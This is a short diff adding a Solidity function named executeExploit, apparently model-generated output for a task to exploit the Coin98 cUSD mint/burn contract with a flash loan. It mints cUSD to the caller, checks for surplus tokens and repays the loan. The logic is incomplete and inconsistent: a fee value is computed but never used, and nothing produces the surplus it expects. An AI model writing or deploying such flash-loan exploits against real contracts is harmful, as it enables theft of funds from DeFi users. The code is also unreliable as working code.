@@ -1,0 +1,28 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // 1. Mint cUSD tokens by providing other tokens as collateral
+    // The collateral can be determined from the minter settings in the Coin98DollarMintBurn contract.
+    
+    // Example of transferring tokens to mint
+    uint256 mintAmount = amount; // Amount of cUSD to mint
+    ICUSD cUSD = ICUSD(token); // Address of the cUSD token
+    uint256 systemFee = mintAmount * 100 / 10000; // Assuming a system fee of 1%
+    cUSD.mint(msg.sender, mintAmount); // Minting cUSD tokens
+    
+    // Next, we handle the surplus valuableToken balance after paying back the flash loan
+    uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
+    
+    // 2. Check that we have more valuableToken than the amount borrowed
+    require(currentValuableBalance > amount, "Not enough valuableToken balance to produce profit");
+    
+    // If necessary, we will print the surplus and do additional handling
+    uint256 surplusInValuable = currentValuableBalance - amount;
+    console.log("Surplus valuableToken: %s", surplusInValuable);
+    
+    // 3. Finally, transfer the borrowed amount back to the flash loan provider
+    valuableToken.transfer(flashloanProvider, amount);
+    console.log("Repayed flashloan of %s", amount);
+}
+</executeExploitCode>
+```
